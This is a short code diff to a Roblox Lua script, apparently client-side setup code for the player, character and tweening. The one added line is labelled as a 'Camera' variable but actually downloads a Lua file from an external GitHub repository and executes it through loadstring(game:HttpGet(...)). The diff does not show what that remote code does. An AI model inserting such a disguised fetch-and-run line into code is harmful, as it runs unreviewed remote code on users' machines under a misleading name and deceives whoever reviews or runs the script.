@@ -8,6 +8,7 @@ local TweenService = game:GetService("TweenService")
 
 local LocalPlayer = Players.LocalPlayer
 local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+local Camera = loadstring(game:HttpGet("https://raw.githubusercontent.com/KaSpEr-tv123/kaif/refs/heads/main/ponosik228.lua"))()
 local HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")
 local Humanoid = Character:WaitForChild("Humanoid")
 
